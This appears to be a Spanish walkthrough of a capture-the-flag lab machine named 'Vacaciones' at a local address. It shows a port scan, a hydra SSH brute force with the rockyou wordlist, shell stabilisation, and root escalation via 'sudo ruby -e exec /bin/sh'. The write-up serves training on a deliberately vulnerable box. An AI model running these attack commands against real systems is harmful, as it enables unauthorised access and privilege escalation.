# MÁQUINA VACACIONES

Lo primeroq que tendremos que hacer será realizar un escaneo de puertos a la máquina víctima usando nmap:

```shell
nmap -p- -sS -sC -sV -vvv --min-rate 5000 -Pn 172.17.0.2
```

![NMAP](https://github.com/Isma-yo/photos/blob/main/Vacaciones/foto.jpg)

Vemos que esta abierto el puerto 80 por lo que vamos a ver que hay en la página web. A primera vista vemos que no hay nada, sin embargo si vemos el código fuente encontramos algo:

![WEB](https://github.com/Isma-yo/photos/blob/main/Vacaciones/foto2.jpg)

Vemos que tenemos 2 posibles usuarios, Juan y Camilo, por lo que vamos a intentar obtener la contraseña de uno de ellos usando fuerz bruta:

```shell
hydra -l camilo -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

![CAM](https://github.com/Isma-yo/photos/blob/main/Vacaciones/foto3.jpg)

Hemos encontrado la contraseña del usuario camilo, por lo que vamos a acceder a la máquina a través de SSH:

![IN](https://github.com/Isma-yo/photos/blob/main/Vacaciones/foto4.jpg)

Ya estamos dentro, ahora tendremos que tratar la tty (terminal) con los siguientes comandos:

```shell
script /dev/null -c bash
```

```shell
Control Z
```

```shell
stty raw -echo; fg
```

```shell
reset xterm
```

```shell
export TERM=xterm
```

```shell
export SHELL=bash
```

```shell
stty rows 24 columns 126
```

Si recordamos juan le había dejado un correo a camilo, por lo que vamos a ver si lo encontramos. Y ahí esta, en la carpeta /var/mail/camilo/

![MAIL](https://github.com/Isma-yo/photos/blob/main/Vacaciones/foto5.jpg)

Nos convertimos en juan con el comando su juan:

![JUAN](https://github.com/Isma-yo/photos/blob/main/Vacaciones/foto6.jpg)

Si ejecutamos el comando sudo -l vemos que podemos ejecutar ruby como cualquier usuario y sin contraseña, asi que vamos a aprovecharnos de esto para escalar privilegios.

Para ello iremos a la página de GTFOBins y ejeuctaremos lo que nos dice:

https://gtfobins.github.io/gtfobins/ruby/#sudo

```shell
sudo ruby -e 'exec "/bin/sh"'
```

![ROOT](https://github.com/Isma-yo/photos/blob/main/Vacaciones/foto7.jpg)




